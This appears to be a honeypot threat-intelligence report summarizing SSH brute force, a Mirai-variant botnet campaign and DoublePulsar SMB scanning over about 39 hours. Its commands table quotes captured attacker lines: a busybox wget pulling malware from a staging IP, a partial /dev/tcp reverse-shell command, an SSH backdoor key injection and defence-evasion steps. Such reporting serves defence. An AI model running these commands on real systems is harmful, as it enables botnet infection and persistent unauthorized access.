# Honeypot Attack Summary Report

**Report Generation Time:** 2025-09-30T07:40:40Z
**Timeframe:** 2025-09-28T14:14:01Z to 2025-09-30T06:00:01Z

**Files Used to Generate Report:**
*   Honeypot_Attack_Summary_Report_2025-09-28T14-37-09Z.md
*   Honeypot_Attack_Summary_Report_2025-09-28T21-01-51Z.md
*   Honeypot_Attack_Summary_Report_2025-09-28T22-03-04Z.md
*   Honeypot_Attack_Summary_Report_2025-09-28T23-02-04Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T00-01-47Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T01-01-37Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T02-02-07Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T04-01-53Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T05-01-54Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T06-01-50Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T07-01-45Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T08-01-48Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T09-02-42Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T10-02-22Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T11-01-58Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T12-02-14Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T13-02-20Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T14-02-04Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T14:58:05Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T15:02:30Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T15:42:56Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T16:02:15Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T17:20:43Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T18:43:06Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T19:02:19Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T20:01:56Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T21:01:52Z.md
*   Honeypot_Attack_Summary_Report_2025-09-29T22:01:52Z.md
*   Honeypot_Attack_Summary_Report_2025-09-30T00:01:58Z.md
*   Honeypot_Attack_Summary_Report_2025-09-30T01:02:03Z.md
*   Honeypot_Attack_Summary_Report_2025-09-30T02:02:12Z.md
*   Honeypot_Attack_Summary_Report_2025-09-30T03:02:05Z.md
*   Honeypot_Attack_Summary_Report_2025-09-30T04:02:01Z.md
*   Honeypot_Attack_Summary_Report_2025-09-30T05:01:53Z.md
*   Honeypot_Attack_Summary_Report_2025-09-30T06:02:00Z.md

---

## Executive Summary
This report provides a comprehensive analysis of 448,569 malicious events recorded across our distributed honeypot network over an approximate 39-hour period. The data reveals a threat landscape dominated by high-volume, automated attacks orchestrated by botnets and scanning infrastructures.

Three major, distinct campaigns were identified:
1.  **SSH Brute-Force and Credential Stuffing:** The most prevalent activity was relentless brute-force attacks against SSH (Port 22), primarily captured by the Cowrie honeypot. A significant subset of these attacks, upon gaining access, attempted to establish persistence by injecting a malicious SSH key with the known "mdrfckr" signature, which is linked to the Outlaw hacking group and Dota3 malware family.
2.  **IoT Botnet Propagation (Mirai Variant):** A widespread campaign focused on compromising IoT devices was observed. Attackers leveraged weak credentials to gain access and then attempted to download and execute the "urbotnetisass" malware, a confirmed variant of the Mirai botnet. Payloads were staged for multiple CPU architectures (ARM, MIPS, x86) on a dedicated server (`94.154.35.154`), indicating a broad effort to infect a diverse range of devices.
3.  **SMB Worm and Exploit Scanning:** A massive volume of traffic targeted port 445 (SMB), with Suricata and Dionaea honeypots frequently detecting signatures for the "DoublePulsar" backdoor. This indicates persistent, automated scanning for SMB vulnerabilities, most notably MS17-010 (EternalBlue), by worm-like malware.

The most aggressive single attacker was identified as **160.25.118.10** (Indonesia), which was responsible for over 30,000 events, primarily targeting SSH services. The threat landscape also showed continued opportunistic scanning for a wide array of vulnerabilities, including the critical Log4Shell (CVE-2021-44228) and numerous older, often-forgotten CVEs, highlighting a strategy of targeting unpatched legacy systems.

Overall, the findings depict a highly automated and relentless barrage of opportunistic attacks. The primary goals of these campaigns are clear: credential harvesting, botnet expansion for DDoS attacks and cryptomining, and establishing persistent backdoors for future exploitation.

---

## Detailed Analysis

### Our IPs (Honeypot Network)
| Honeypot Name | Private IP | Public IP |
|---------------|------------|---------------|
| hive-us | 10.128.0.3 | 34.123.129.205 |
| sens-tai | 10.140.0.3 | 104.199.212.115|
| sens-tel | 10.208.0.3 | 34.165.197.224 |
| sens-dub | 172.31.36.128| 3.253.97.195 |
| sens-ny | 10.108.0.2 | 161.35.180.163 |

### Attacks by Honeypot
| Honeypot | Attack Count |
|---|---|
| Cowrie | 169,321 |
| Honeytrap | 69,578 |
| Suricata | 61,003 |
| Ciscoasa | 49,603 |
| Dionaea | 20,443 |
| Mailoney | 6,562 |
| Sentrypeer | 4,500 |
| Redishoneypot | 1,228 |
| Tanner | 1,189 |
| Adbhoney | 868 |
| H0neytr4p | 741 |
| ConPot | 599 |
| ElasticPot | 313 |
| Heralding | 258 |
| Dicompot | 165 |
| ssh-rsa | 90 |
| Honeyaml | 87 |
| Miniprint | 83 |
| Ipphoney | 43 |
| Wordpot | 5 |

### Top Source Countries
*Note: Country data was not consistently available in the provided summaries. The following are inferred from the geographic distribution of top attacker IP addresses.*
- Indonesia
- United States
- Vietnam
- China
- Germany
- Russia

### Top Attacking IPs
| IP Address | Total Events |
|---|---|
| 160.25.118.10 | 30,531 |
| 142.93.159.126 | 5,441 |
| 137.184.169.79 | 5,023 |
| 4.144.169.44 | 4,202 |
| 5.129.251.145 | 3,320 |
| 134.199.197.102 | 3,010 |
| 147.182.150.164 | 2,971 |
| 121.52.153.77 | 2,984 |
| 39.107.106.103 | 2,540 |
| 113.160.224.21 | 2,456 |
| 171.224.232.193 | 2,346 |
| 103.99.112.56 | 1,916 |
| 81.183.253.80 | 1,570 |
| 45.78.224.98 | 1,958 |
| 143.198.32.86 | 1,516 |

### Top Targeted Ports/Protocols
| Port | Protocol | Attack Count |
|---|---|---|
| 22 | TCP | 26,051 |
| 445 | TCP | 21,780 |
| 5060 | TCP/UDP | 4,758 |
| 8333 | TCP | 2,367 |
| 23 | TCP | 2,130 |
| 25 | TCP | 1,941 |
| 6379 | TCP | 973 |
| 80 | TCP | 954 |
| 1433 | TCP | 780 |
| 5900 | TCP | 616 |

### Most Common CVEs
| CVE ID | Count |
|---|---|
| CVE-2021-44228 (Log4Shell) | 363 |
| CVE-2002-0013 / CVE-2002-0012 | 148 |
| CVE-2019-11500 | 79 |
| CVE-2021-3449 | 75 |
| CVE-1999-0517 | 63 |
| CVE-1999-0265 | 58 |
| CVE-2022-27255 | 55 |
| CVE-2005-4050 | 25 |
| CVE-2024-3721 | 10 |
| CVE-2006-2369 | 10 |
| CVE-2018-13379 | 4 |

### Commands Attempted by Attackers
| Command |
|---|
| `uname -a` (and other reconnaissance like `whoami`, `lscpu`, `df`, `free`) |
| `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr" >> .ssh/authorized_keys` |
| `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...` |
| `rm -rf /tmp/secure.sh; pkill -9 secure.sh; echo > /etc/hosts.deny` |
| `Enter new UNIX password:` |
| `nohup bash -c "exec 6<>/dev/tcp/..."` |
| `cat /proc/cpuinfo | grep name | wc -l` |

### Signatures Triggered
| Signature |
|---|
| ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication |
| ET DROP Dshield Block Listed Source group 1 |
| ET SCAN NMAP -sS window 1024 |
| ET SCAN Potential SSH Scan |
| ET SCAN MS Terminal Server Traffic on Non-standard Port |
| ET INFO Reserved Internal IP Traffic |
| ET DROP Spamhaus DROP Listed Traffic Inbound |
| ET INFO CURL User Agent |

### Users / Login Attempts
| Username/Password Combination |
|---|
| 345gs5662d34 / 345gs5662d34 |
| root / (various common passwords like `123456`, `admin`, `password`, `toor`) |
| admin / admin |
| root / 3245gs5662d34 |
| root / nPSpP4PBW0 |
| root / LeitboGi0ro |
| test / zhbjETuyMffoL8F |
| foundry / foundry |
| postgres / postgres |
| sa / (blank) |

### Files Uploaded/Downloaded
| Filename |
|---|
| arm.urbotnetisass |
| arm5.urbotnetisass |
| arm6.urbotnetisass |
| arm7.urbotnetisass |
| x86_32.urbotnetisass |
| mips.urbotnetisass |
| mipsel.urbotnetisass |
| Mozi.m |
| w.sh |
| c.sh |
| wget.sh |

### HTTP User-Agents
*Note: This data was not consistently available in the summarized logs.*

### SSH Clients and Servers
*Note: This data was not consistently available in the summarized logs.*

### Top Attacker AS Organizations
*Note: This data was not consistently available in the summarized logs.*

---
## Google Searches
- threat intelligence on IP address 160.25.118.10
- Information on "urbotnetisass" malware
- Information on "mdrfckr" SSH key signature

---

## Key Observations and Anomalies

**1. High-Volume Attacker: 160.25.118.10**
The IP address **160.25.118.10**, located in Indonesia, was by far the most aggressive single source of attacks, logging over 30,000 events. Its activity was almost exclusively focused on high-speed, automated brute-force attacks against SSH (port 22). Threat intelligence confirms this IP is on multiple blocklists, including the FireHOL C.I. Army Malicious IP list. The sheer volume and focus suggest it is a compromised server or part of a dedicated botnet infrastructure used for initial access attempts.

**2. Campaign: The "Urbotnetisass" Mirai Variant**
A clear and widespread campaign was identified, aimed at recruiting IoT devices into a botnet. The attackers' TTPs were consistent:
- Gain initial access via default or weak credentials on services like Telnet and SSH.
- Execute a one-liner command to change to a temporary directory (`/data/local/tmp/`).
- Use `wget` or `curl` to download payloads from a staging server at `94.154.35.154`.
- The payloads, named `*.urbotnetisass`, were compiled for multiple architectures (ARM, MIPS, x86) to maximize the range of infectable devices.
- Research confirms "urbotnetisass" is a variant of the Mirai botnet, primarily used for DDoS attacks.

**3. Campaign: SSH Persistence via "mdrfckr" Key**
A common post-exploitation technique observed after successful SSH logins was the injection of a malicious public SSH key. This key was consistently identified by the comment "mdrfckr" at the end of the key string. This is a known Indicator of Compromise (IOC) linked to the Outlaw hacking group. The attacker's script would wipe the existing `.ssh` directory and install this key, ensuring persistent, passwordless access for future malicious activities, such as deploying cryptominers or DDoS agents.

**4. Campaign: Widespread SMB Exploitation (DoublePulsar)**
The honeypot network recorded massive inbound traffic on port 445 (SMB). The Suricata IDS consistently triggered the signature "ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication." This indicates large-scale, automated scanning by worms or botnets attempting to exploit the MS17-010 (EternalBlue) vulnerability to install the DoublePulsar backdoor, a tactic that remains highly prevalent years after its initial discovery.

**5. Attacker Methodology: Reconnaissance and Defense Evasion**
Post-compromise activity almost invariably began with a standard reconnaissance playbook. Attackers executed commands like `uname -a`, `lscpu`, `df -h`, and `free -m` to fingerprint the system's architecture and resources. This was often followed by defense evasion techniques, such as using `chattr` to make their SSH key immutable, killing processes of potential rival malware (`pkill -9 secure.sh`), and clearing firewall rules (`echo > /etc/hosts.deny`). This systematic approach is indicative of well-scripted, automated attack frameworks.

---
**End of Report**
